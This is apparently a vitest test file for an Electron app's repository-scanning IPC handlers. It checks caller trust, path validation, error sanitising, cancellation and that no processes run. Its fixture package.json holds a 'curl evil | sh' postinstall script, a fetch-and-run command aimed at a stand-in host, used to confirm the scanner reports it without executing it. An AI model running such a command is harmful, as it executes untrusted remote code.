// The repository-analysis IPC handlers with the real scanner on disposable
// fixture repositories. Electron's ipcMain is mocked; senders, frames and the
// main window are fakes, so caller checks can be exercised directly.
import { EventEmitter } from "node:events";
import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { pathToFileURL } from "node:url";
import { afterAll, afterEach, beforeAll, beforeEach, describe, expect, it, vi } from "vitest";

const h = vi.hoisted(() => ({
  handlers: new Map<string, (...args: unknown[]) => Promise<unknown>>(),
  executed: [] as string[],
}));

vi.mock("electron", () => ({
  ipcMain: { handle: (channel: string, fn: (...args: unknown[]) => Promise<unknown>) => h.handlers.set(channel, fn) },
}));
vi.mock("child_process", () => {
  const forbid = (name: string) => (...args: unknown[]) => {
    h.executed.push(`${name} ${String(args[0])}`);
    throw new Error("analysis must not execute processes");
  };
  return { spawn: forbid("spawn"), exec: forbid("exec"), execFile: forbid("execFile"), fork: forbid("fork"), spawnSync: forbid("spawnSync"), execSync: forbid("execSync"), execFileSync: forbid("execFileSync") };
});
vi.mock("node:child_process", async () => await import("child_process"));

import { RepoAnalysisService, isTrustedSender, registerRepoAnalysisIpc, type TrustedRenderer } from "../../electron/repoAnalysisIpc.js";
import { RepoScanSession } from "../../electron/repoScanner/scanSession.js";
import { REPO_ANALYSIS_ERROR_MESSAGES, type RepoAnalysisErrorCode, type RepoScanResult } from "../../src/types.js";
import { FixtureSpace, pkg } from "./repoScanner/fixtures.js";

const PACKAGED_URL = pathToFileURL(path.join(os.tmpdir(), "RepoRunner App", "resources", "app.asar", "dist", "public", "index.html")).href;
const DEV_URL = "http://localhost:5173/";

class FakeFrame {
  detached = false;
  parent: FakeFrame | null = null;
  constructor(public url: string, public processId = 4, public routingId = 1) {}
}

class FakeContents extends EventEmitter {
  destroyed = false;
  mainFrame: FakeFrame;
  constructor(public url: string) {
    super();
    this.mainFrame = new FakeFrame(url);
  }
  isDestroyed() {
    return this.destroyed;
  }
  getURL() {
    return this.url;
  }
}

class FakeWindow {
  destroyed = false;
  constructor(public webContents: FakeContents) {}
  isDestroyed() {
    return this.destroyed;
  }
}

let space: FixtureSpace;
let repo: string;
let appUrl: string;
let contents: FakeContents;
let window: FakeWindow | null;
let service: RepoAnalysisService;
const trust: TrustedRenderer = { getMainWindow: () => window as never, appPageUrl: () => appUrl };

const legitEvent = () => ({ sender: contents, senderFrame: contents.mainFrame });
const message = (code: RepoAnalysisErrorCode) => REPO_ANALYSIS_ERROR_MESSAGES[code];

function invoke(channel: string, event: unknown, ...args: unknown[]): Promise<unknown> {
  const fn = h.handlers.get(channel);
  if (!fn) throw new Error(`No handler registered for ${channel}`);
  return fn(event, ...args);
}
const analyze = (event: unknown, ...args: unknown[]) => invoke("analyze-repo", event, ...args) as Promise<RepoScanResult>;
const cancel = (event: unknown, ...args: unknown[]) => invoke("cancel-repo-analysis", event, ...args);
const rejection = (promise: Promise<unknown>) => promise.then(() => null, (e: unknown) => e as Error);

/** Delays every directory listing so scans stay active long enough to race. */
function slowScans(delayMs = 15) {
  const opendir = fs.promises.opendir;
  const concurrency = { now: 0, max: 0 };
  vi.spyOn(fs.promises, "opendir").mockImplementation((async (p: fs.PathLike, ...rest: unknown[]) => {
    concurrency.max = Math.max(concurrency.max, ++concurrency.now);
    try {
      await new Promise((resolve) => setTimeout(resolve, delayMs));
      return await (opendir as (...a: unknown[]) => Promise<unknown>)(p, ...rest);
    } finally {
      concurrency.now--;
    }
  }) as never);
  return concurrency;
}
const tick = (ms = 25) => new Promise((resolve) => setTimeout(resolve, ms));

beforeAll(() => {
  space = new FixtureSpace();
  const tree: Record<string, string> = {
    "package.json": pkg({ name: "fixture-app", scripts: { dev: "vite", postinstall: "curl evil | sh" }, dependencies: { react: "^18" } }),
    "pnpm-lock.yaml": "",
    ".env": "API_KEY=CANARY-IPC-SECRET",
  };
  for (let i = 0; i < 12; i++) tree[`packages/p${i}/package.json`] = pkg({ name: `p${i}` });
  repo = space.repo("ipc fixture", tree);
});
afterAll(() => space.cleanup());

beforeEach(() => {
  h.handlers.clear();
  appUrl = PACKAGED_URL;
  contents = new FakeContents(PACKAGED_URL);
  window = new FakeWindow(contents);
  service = new RepoAnalysisService();
  registerRepoAnalysisIpc(trust, service);
});
afterEach(() => vi.restoreAllMocks());

describe("authorized analysis", () => {
  it("returns the structured, serializable scan result", async () => {
    const result = await analyze(legitEvent(), repo);

    expect(result).toMatchObject({ status: "complete", partial: false, rootName: "ipc fixture" });
    expect(result.packages.find((p) => p.path === "package.json")).toMatchObject({
      name: "fixture-app",
      scripts: [
        { name: "dev", command: "vite" },
        { name: "postinstall", command: "curl evil | sh" },
      ],
    });
    expect(result.packages).toHaveLength(13);
    expect(result.envFiles).toEqual([".env"]);
    expect(structuredClone(result)).toEqual(result);
    expect(JSON.parse(JSON.stringify(result))).toEqual(result);
    const serialized = JSON.stringify(result);
    expect(serialized).not.toContain(repo); // root-relative paths only
    expect(serialized).not.toContain(space.base);
    expect(serialized).not.toContain("CANARY-IPC-SECRET");
    expect(h.executed).toEqual([]);
  });

  it("accepts the dev server page in development (query and fragment ignored)", async () => {
    appUrl = DEV_URL;
    contents = new FakeContents("http://localhost:5173/#setup");
    window = new FakeWindow(contents);
    await expect(analyze(legitEvent(), repo)).resolves.toMatchObject({ status: "complete" });
  });

  it("keeps interrupted results distinct from complete ones", async () => {
    slowScans();
    const scanning = analyze(legitEvent(), repo);
    await tick();
    await cancel(legitEvent());
    const result = await scanning;
    expect(result.status).toBe("cancelled");
    expect(result.partial).toBe(true);
  });
});

describe("argument validation", () => {
  it.each([
    ["a number", 42],
    ["null", null],
    ["an object", { path: "C:\\repo" }],
    ["an array", ["C:\\repo"]],
    ["a String object", new String("C:\\repo")],
    ["an empty string", ""],
    ["an overlong string", `C:\\${"a".repeat(5000)}`],
  ])("rejects %s as invalid-path without touching the filesystem", async (_label, value) => {
    const realpath = vi.spyOn(fs.promises, "realpath");
    const error = await rejection(analyze(legitEvent(), value));
    expect(error?.message).toBe(message("invalid-path"));
    expect(realpath).not.toHaveBeenCalled();
  });

  it("rejects a missing or extra argument as invalid-request", async () => {
    expect((await rejection(analyze(legitEvent())))?.message).toBe(message("invalid-request"));
    expect((await rejection(analyze(legitEvent(), repo, { limits: { maxDepth: 1000 } })))?.message).toBe(message("invalid-request"));
    expect((await rejection(cancel(legitEvent(), "scan-id-1")))?.message).toBe(message("invalid-request"));
  });

  it("keeps the scanner's own root validation as a separate layer", async () => {
    const cases: Array<[string, RepoAnalysisErrorCode]> = [
      ["relative/repo", "invalid-path"],
      [path.join(space.base, "does-not-exist"), "not-found"],
      [path.join(repo, "package.json"), "not-a-directory"],
      [path.parse(repo).root, "root-not-allowed"],
      [os.homedir(), "root-not-allowed"],
    ];
    if (process.platform === "win32") cases.push(["\\\\server\\share\\repo", "root-not-allowed"]);
    for (const [input, code] of cases) {
      const error = await rejection(analyze(legitEvent(), input));
      expect(error?.message, input).toBe(message(code));
      expect(error?.message).not.toContain(input);
    }
  });

  it("no raw filesystem error, path or stack detail crosses IPC", async () => {
    const secretPath = path.join(space.base, "private", "secret-folder");
    vi.spyOn(fs.promises, "realpath").mockRejectedValue(Object.assign(new Error(`EACCES: permission denied, realpath '${secretPath}'`), { code: "EACCES", path: secretPath }));
    const unreadable = await rejection(analyze(legitEvent(), secretPath));
    expect(unreadable?.message).toBe(message("unreadable"));

    vi.spyOn(RepoScanSession.prototype, "scan").mockRejectedValue(new Error(`EIO: i/o error, opendir '${secretPath}'`));
    const failed = await rejection(analyze(legitEvent(), repo));
    expect(failed?.message).toBe(message("failed"));

    for (const error of [unreadable!, failed!]) {
      expect(Object.keys(error)).toEqual([]); // no code/path/errno properties
      expect(`${error.message}\n${error.stack}`).not.toMatch(/EACCES|EIO|secret-folder|realpath|opendir/);
    }
  });

  it("every analysis error message is fixed and value-free", () => {
    for (const text of Object.values(REPO_ANALYSIS_ERROR_MESSAGES)) {
      expect(text).not.toMatch(/[A-Za-z]:\\|\/Users\/|\/home\/|ENOENT|EACCES|\$\{/);
    }
  });
});

describe("caller checks", () => {
  async function expectRefused(event: unknown) {
    const realpath = vi.spyOn(fs.promises, "realpath");
    const scan = vi.spyOn(RepoScanSession.prototype, "scan");
    expect((await rejection(analyze(event, repo)))?.message).toBe(message("not-allowed"));
    expect((await rejection(cancel(event)))?.message).toBe(message("not-allowed"));
    expect(realpath).not.toHaveBeenCalled();
    expect(scan).not.toHaveBeenCalled();
  }

  it("refuses a foreign webContents, even on the app page", async () => {
    const foreign = new FakeContents(PACKAGED_URL);
    await expectRefused({ sender: foreign, senderFrame: foreign.mainFrame });
  });

  it("refuses the legitimate webContents with a foreign senderFrame", async () => {
    await expectRefused({ sender: contents, senderFrame: new FakeFrame(PACKAGED_URL, 4, 99) });
    await expectRefused({ sender: contents, senderFrame: new FakeFrame(PACKAGED_URL, 7, 1) });
  });

  it("refuses a missing or detached senderFrame", async () => {
    await expectRefused({ sender: contents, senderFrame: null });
    await expectRefused({ sender: contents });
    contents.mainFrame.detached = true;
    await expectRefused(legitEvent());
  });

  it("refuses a child frame, even one showing the app page", async () => {
    const child = new FakeFrame(PACKAGED_URL, 4, 1);
    child.parent = contents.mainFrame;
    await expectRefused({ sender: contents, senderFrame: child });
  });

  it.each([
    "http://localhost:5174/",
    "http://127.0.0.1:5173/",
    "https://localhost:5173/",
    "http://localhost:5173/other.html",
    "http://user:pw@localhost:5173/",
    "http://localhost.evil.com:5173/",
    PACKAGED_URL,
  ])("development: refuses %s", async (url) => {
    appUrl = DEV_URL;
    contents = new FakeContents(url);
    window = new FakeWindow(contents);
    await expectRefused(legitEvent());
  });

  it.each([
    pathToFileURL(path.join(os.tmpdir(), "evil", "index.html")).href,
    pathToFileURL(path.join(os.tmpdir(), "RepoRunner App", "resources", "app.asar", "dist", "public", "other.html")).href,
    `${PACKAGED_URL.replace(/index\.html$/, "")}`,
    DEV_URL,
    "https://example.com/index.html",
    "about:blank",
    "data:text/html,<script>1</script>",
  ])("packaged: refuses document %s", async (url) => {
    contents = new FakeContents(url);
    window = new FakeWindow(contents);
    await expectRefused(legitEvent());
  });

  it("refuses when the frame URL and the webContents URL disagree", async () => {
    contents.url = "https://example.com/";
    await expectRefused(legitEvent());
  });

  it("refuses a destroyed window or webContents, or no window at all", async () => {
    window!.destroyed = true;
    await expectRefused(legitEvent());
    window!.destroyed = false;
    contents.destroyed = true;
    await expectRefused(legitEvent());
    window = null;
    await expectRefused(legitEvent());
  });

  it("refuses when the frame throws on access (already disposed)", async () => {
    const disposed = {};
    Object.defineProperty(disposed, "url", { get: () => { throw new Error("Render frame was disposed"); } });
    Object.defineProperty(disposed, "parent", { get: () => null });
    Object.assign(disposed, { processId: 4, routingId: 1, detached: false });
    await expectRefused({ sender: contents, senderFrame: disposed });
  });

  it("does not trust anything the renderer passes as arguments", async () => {
    // A forged "origin" argument cannot help a foreign caller.
    const foreign = new FakeContents("https://example.com/");
    const forged = { sender: foreign, senderFrame: foreign.mainFrame };
    expect((await rejection(analyze(forged, repo)))?.message).toBe(message("not-allowed"));
    expect(isTrustedSender(forged as never, trust)).toBe(false);
  });

  it("refuses everything when no trusted renderer was configured (setupIpc default)", async () => {
    h.handlers.clear();
    registerRepoAnalysisIpc(undefined, service);
    await expectRefused(legitEvent());
  });
});

describe("one scan at a time, cancellation and lifecycle", () => {
  it("a second request while scanning gets scan-in-progress", async () => {
    slowScans();
    const first = analyze(legitEvent(), repo);
    const second = await rejection(analyze(legitEvent(), repo));
    expect(second?.message).toBe(message("scan-in-progress"));
    await expect(first).resolves.toMatchObject({ status: "complete" });
    await expect(analyze(legitEvent(), repo)).resolves.toMatchObject({ status: "complete" });
  });

  it("cancel answers at once; ownership is held until the work has finished; the next scan waits and never overlaps", async () => {
    const concurrency = slowScans(40);
    const first = analyze(legitEvent(), repo);
    await tick();
    await expect(cancel(legitEvent())).resolves.toBeUndefined();
    expect(service.isScanning).toBe(true); // not released by the cancel itself
    expect((await first).status).toBe("cancelled"); // answered while an opendir is still pending
    expect(service.isScanning).toBe(true);
    // A new request waits for the finishing scan instead of failing or overlapping.
    const next = await analyze(legitEvent(), repo);
    expect(next.status).toBe("complete");
    expect(concurrency.max).toBe(1);
    expect(service.isScanning).toBe(false);
  });

  it("if a cancelled scan's filesystem call stays blocked, a new request is refused clearly after a bounded wait", async () => {
    const target = path.join(repo, "packages");
    const opendir = fs.promises.opendir;
    let release!: () => void;
    const gate = new Promise<void>((resolve) => (release = resolve));
    vi.spyOn(fs.promises, "opendir").mockImplementation((async (p: fs.PathLike, ...rest: unknown[]) => {
      if (path.resolve(String(p)) === target) await gate;
      return (opendir as (...a: unknown[]) => unknown)(p, ...rest);
    }) as never);
    const first = analyze(legitEvent(), repo);
    await vi.waitFor(() => expect(service.isScanning).toBe(true));
    await tick(50);
    await cancel(legitEvent());
    expect((await first).status).toBe("cancelled");

    const started = Date.now();
    const refused = await rejection(analyze(legitEvent(), repo));
    expect(refused?.message).toBe(message("scan-in-progress"));
    expect(Date.now() - started).toBeGreaterThanOrEqual(1500); // waited, bounded
    expect(Date.now() - started).toBeLessThan(5000);

    release();
    await vi.waitFor(() => expect(service.isScanning).toBe(false));
    await expect(analyze(legitEvent(), repo)).resolves.toMatchObject({ status: "complete" });
  }, 15_000); // includes the deliberate 2 s bounded wait

  it("package caps reach the caller as a partial result through IPC", async () => {
    const capped = space.repo("ipc caps", { "package.json": pkg({ name: "capped", scripts: Object.fromEntries(Array.from({ length: 101 }, (_, i) => [`s${i}`, "echo"])) }) });
    const result = await analyze(legitEvent(), capped);
    expect(result).toMatchObject({ status: "truncated", partial: true });
    expect(result.packages[0].scriptsTruncated).toBe(true);
  });

  it("a request while a scan is still running (not cancelled) is refused at once", async () => {
    slowScans();
    const first = analyze(legitEvent(), repo);
    await tick();
    const started = Date.now();
    expect((await rejection(analyze(legitEvent(), repo)))?.message).toBe(message("scan-in-progress"));
    expect(Date.now() - started).toBeLessThan(500);
    await expect(first).resolves.toMatchObject({ status: "complete" });
  });

  it("cancel with no active scan is a harmless no-op", async () => {
    await expect(cancel(legitEvent())).resolves.toBeUndefined();
    await expect(analyze(legitEvent(), repo)).resolves.toMatchObject({ status: "complete" });
  });

  it("an unauthorized cancel is rejected and the scan continues", async () => {
    slowScans();
    const scanning = analyze(legitEvent(), repo);
    await tick();
    const foreign = new FakeContents(PACKAGED_URL);
    expect((await rejection(cancel({ sender: foreign, senderFrame: foreign.mainFrame })))?.message).toBe(message("not-allowed"));
    await expect(scanning).resolves.toMatchObject({ status: "complete" });
  });

  it("only the webContents that started a scan can cancel it", async () => {
    slowScans();
    const other = new FakeContents(PACKAGED_URL);
    const scanning = service.analyze(contents as never, repo);
    await tick();
    expect(() => service.cancel(other as never)).toThrow(message("not-allowed"));
    await expect(scanning).resolves.toMatchObject({ status: "complete" });
  });

  it("window destruction during a scan aborts it and releases ownership", async () => {
    slowScans();
    const scanning = analyze(legitEvent(), repo);
    await tick();
    contents.destroyed = true;
    contents.emit("destroyed");
    expect((await scanning).status).toBe("cancelled");
    await vi.waitFor(() => expect(service.isScanning).toBe(false));
    expect(contents.listenerCount("destroyed")).toBe(0);
    expect(contents.listenerCount("render-process-gone")).toBe(0);
  });

  it("a renderer crash during a scan aborts it", async () => {
    slowScans();
    const scanning = analyze(legitEvent(), repo);
    await tick();
    contents.emit("render-process-gone", {}, { reason: "crashed" });
    expect((await scanning).status).toBe("cancelled");
  });

  it("application shutdown aborts the active scan and refuses new ones", async () => {
    slowScans();
    const scanning = analyze(legitEvent(), repo);
    await tick();
    service.shutdown();
    expect((await scanning).status).toBe("cancelled");
    expect((await rejection(analyze(legitEvent(), repo)))?.message).toBe(message("unavailable"));
    await expect(cancel(legitEvent())).resolves.toBeUndefined();
  });
});

describe("reload and navigation of the calling page", () => {
  const LIFECYCLE_EVENTS = ["destroyed", "render-process-gone", "did-start-navigation"];
  const navigation = (details: Record<string, unknown> | undefined) => contents.emit("did-start-navigation", details, "deprecated-url-arg");

  it("a reload while scanning aborts the scan", async () => {
    slowScans();
    const scanning = analyze(legitEvent(), repo);
    await tick();
    navigation({ url: PACKAGED_URL, isMainFrame: true, isSameDocument: false, frame: contents.mainFrame });
    expect((await scanning).status).toBe("cancelled");
  });

  it("a main-frame navigation or document replacement while scanning aborts the scan", async () => {
    for (const details of [
      { url: "https://example.com/", isMainFrame: true, isSameDocument: false },
      { url: PACKAGED_URL, isMainFrame: true }, // isSameDocument missing
      undefined, // malformed event: treated as a navigation
    ]) {
      slowScans();
      const scanning = analyze(legitEvent(), repo);
      await tick();
      navigation(details);
      expect((await scanning).status, JSON.stringify(details)).toBe("cancelled");
      vi.restoreAllMocks();
    }
  });

  it("same-document changes and sub-frame navigations do not abort", async () => {
    slowScans();
    const scanning = analyze(legitEvent(), repo);
    await tick();
    navigation({ url: `${PACKAGED_URL}#results`, isMainFrame: true, isSameDocument: true });
    navigation({ url: "https://example.com/ad", isMainFrame: false, isSameDocument: false });
    expect((await scanning).status).toBe("complete");
  });

  it("after a reload, a new scan waits for the old one to stop, then runs normally", async () => {
    slowScans();
    const old = analyze(legitEvent(), repo);
    await tick();
    navigation({ url: PACKAGED_URL, isMainFrame: true, isSameDocument: false });
    // The reloaded page asks straight away: refused until the old scan has stopped.
    expect((await rejection(analyze(legitEvent(), repo)))?.message).toBe(message("scan-in-progress"));
    expect((await old).status).toBe("cancelled");
    vi.restoreAllMocks();
    const fresh = await analyze(legitEvent(), repo);
    expect(fresh.status).toBe("complete");
    expect(fresh.packages).toHaveLength(13);
  });

  it("a stale lifecycle listener from a finished scan cannot cancel the next one", async () => {
    slowScans();
    const first = analyze(legitEvent(), repo);
    await tick();
    const staleListeners = LIFECYCLE_EVENTS.flatMap((event) => contents.listeners(event) as Array<(...args: unknown[]) => void>);
    expect(staleListeners).toHaveLength(3);
    expect((await first).status).toBe("complete");

    const second = analyze(legitEvent(), repo);
    await tick();
    // Even if Electron delivered an event to an old listener late, it is inert.
    for (const listener of staleListeners) listener({ isMainFrame: true, isSameDocument: false });
    expect((await second).status).toBe("complete");
  });

  it("a navigation in a previous owner's page cannot cancel a later scan", async () => {
    const previous = new FakeContents(PACKAGED_URL);
    await service.analyze(previous as never, repo);
    slowScans();
    const later = analyze(legitEvent(), repo);
    await tick();
    previous.emit("did-start-navigation", { isMainFrame: true, isSameDocument: false });
    expect((await later).status).toBe("complete");
  });

  it("cancels once however many lifecycle events arrive, and removes every listener", async () => {
    slowScans();
    const cancelSpy = vi.spyOn(RepoScanSession.prototype, "cancel");
    const scanning = analyze(legitEvent(), repo);
    await tick();
    for (const event of LIFECYCLE_EVENTS) expect(contents.listenerCount(event), event).toBe(1);

    navigation({ isMainFrame: true, isSameDocument: false });
    navigation({ isMainFrame: true, isSameDocument: false });
    contents.emit("render-process-gone", {}, { reason: "crashed" });
    contents.emit("destroyed");
    expect(cancelSpy).toHaveBeenCalledTimes(1); // four events, one abort

    expect((await scanning).status).toBe("cancelled");
    expect(cancelSpy).toHaveBeenCalledTimes(1);
    for (const event of LIFECYCLE_EVENTS) expect(contents.listenerCount(event), event).toBe(0);
  });

  it("listeners are removed after completion and after failure", async () => {
    await analyze(legitEvent(), repo);
    for (const event of LIFECYCLE_EVENTS) expect(contents.listenerCount(event), event).toBe(0);
    await rejection(analyze(legitEvent(), path.join(space.base, "missing")));
    for (const event of LIFECYCLE_EVENTS) expect(contents.listenerCount(event), event).toBe(0);
  });
});

describe("races around cancellation and completion", () => {
  it("cancelling at varied moments always yields complete or cancelled, and the next scan is unaffected", async () => {
    const concurrency = slowScans(5);
    for (const delay of [0, 1, 3, 8, 15, 30, 60, 120]) {
      const scanning = analyze(legitEvent(), repo);
      setTimeout(() => void cancel(legitEvent()), delay);
      const result = await scanning;
      expect(["complete", "cancelled"]).toContain(result.status);
      expect(result.partial).toBe(result.status !== "complete");
      await tick(delay + 5); // let the cancel land, even after completion
      // A cancelled answer can arrive while the scan's last filesystem call is
      // still in flight; ownership is held until it returns, then released.
      await vi.waitFor(() => expect(service.isScanning).toBe(false), { timeout: 2000, interval: 5 });
    }
    expect(concurrency.max).toBe(1); // no two scans' filesystem work ever overlapped
    vi.restoreAllMocks();
    const next = await analyze(legitEvent(), repo);
    expect(next.status).toBe("complete");
    expect(next.packages).toHaveLength(13);
  });

  it("a cancel arriving after completion does not affect the next scan", async () => {
    const first = await analyze(legitEvent(), repo);
    slowScans();
    const second = analyze(legitEvent(), repo);
    // The earlier scan's lifecycle listeners are gone; only the new scan's remain.
    expect(contents.listenerCount("destroyed")).toBe(1);
    const result = await second;
    expect(first.status).toBe("complete");
    expect(result.status).toBe("complete");
  });

  it("late lifecycle events from a finished scan cannot cancel a later one", async () => {
    const otherContents = new FakeContents(PACKAGED_URL);
    await service.analyze(otherContents as never, repo);
    slowScans();
    const later = analyze(legitEvent(), repo);
    await tick();
    otherContents.emit("render-process-gone");
    otherContents.emit("destroyed");
    expect((await later).status).toBe("complete");
  });

  it("the cancelled scan's late result goes only to its own caller", async () => {
    slowScans();
    const first = analyze(legitEvent(), repo);
    await tick();
    await cancel(legitEvent());
    const firstResult = await first;
    vi.restoreAllMocks();
    const second = await analyze(legitEvent(), repo);
    expect(firstResult.status).toBe("cancelled");
    expect(second.status).toBe("complete");
    expect(second).not.toBe(firstResult);
    expect(firstResult.status).toBe("cancelled"); // unchanged by the later scan
  });
});

describe("no execution, no persistence", () => {
  it("analysis performs no process execution and no filesystem writes", async () => {
    const writes = [
      vi.spyOn(fs.promises, "writeFile"),
      vi.spyOn(fs.promises, "appendFile"),
      vi.spyOn(fs.promises, "mkdir"),
      vi.spyOn(fs.promises, "rename"),
      vi.spyOn(fs.promises, "rm"),
      vi.spyOn(fs.promises, "unlink"),
      vi.spyOn(fs.promises, "copyFile"),
      vi.spyOn(fs, "writeFileSync"),
      vi.spyOn(fs, "renameSync"),
      vi.spyOn(fs, "mkdirSync"),
      vi.spyOn(fs, "rmSync"),
      vi.spyOn(fs, "unlinkSync"),
    ];
    const open = fs.promises.open;
    const modes: unknown[] = [];
    vi.spyOn(fs.promises, "open").mockImplementation(((p: fs.PathLike, flags?: unknown, ...rest: unknown[]) => {
      modes.push(flags);
      return (open as (...a: unknown[]) => unknown)(p, flags, ...rest);
    }) as never);

    await analyze(legitEvent(), repo);

    for (const spy of writes) expect(spy).not.toHaveBeenCalled();
    expect(modes.length).toBeGreaterThan(0);
    for (const flags of modes) expect(Number(flags) & (fs.constants.O_WRONLY | fs.constants.O_RDWR)).toBe(0);
    expect(h.executed).toEqual([]);
  });

  it("the IPC module imports only Electron, the scanner, the shared sender check and shared types", () => {
    const source = fs.readFileSync(path.resolve(import.meta.dirname, "../../electron/repoAnalysisIpc.ts"), "utf8");
    const imports = [...source.matchAll(/from\s+"([^"]+)"/g)].map((m) => m[1]).sort();
    expect([...new Set(imports)]).toEqual(
      ["../src/types.js", "./ipcTrust.js", "./repoScanner/scanRepository.js", "./repoScanner/scanSession.js", "./repoScanner/types.js", "electron"],
    );
    expect(source).not.toMatch(/child_process|projectStore|processManager|\bfetch\(|import\(|require\(/);
    // The shared sender check itself uses only Electron types and window security.
    const trustSource = fs.readFileSync(path.resolve(import.meta.dirname, "../../electron/ipcTrust.ts"), "utf8");
    expect([...trustSource.matchAll(/from\s+"([^"]+)"/g)].map((m) => m[1]).sort()).toEqual(["./windowSecurity.js", "electron"]);
    expect(trustSource).toMatch(/^import type \{[^}]*\} from "electron";$/m);
    expect(trustSource).not.toMatch(/child_process|projectStore|processManager|\bfetch\(|import\(|require\(/);
  });

  it("the renderer's shared types import the scanner contract as types only", () => {
    const source = fs.readFileSync(path.resolve(import.meta.dirname, "../../src/types.ts"), "utf8");
    const scannerImports = [...source.matchAll(/^(import|export)\s+(type\s+)?[^;]*?from\s+"\.\.\/electron\/[^"]+";/gms)];
    expect(scannerImports.length).toBeGreaterThan(0);
    for (const statement of scannerImports) expect(statement[2], statement[0]).toBe("type ");
  });
});
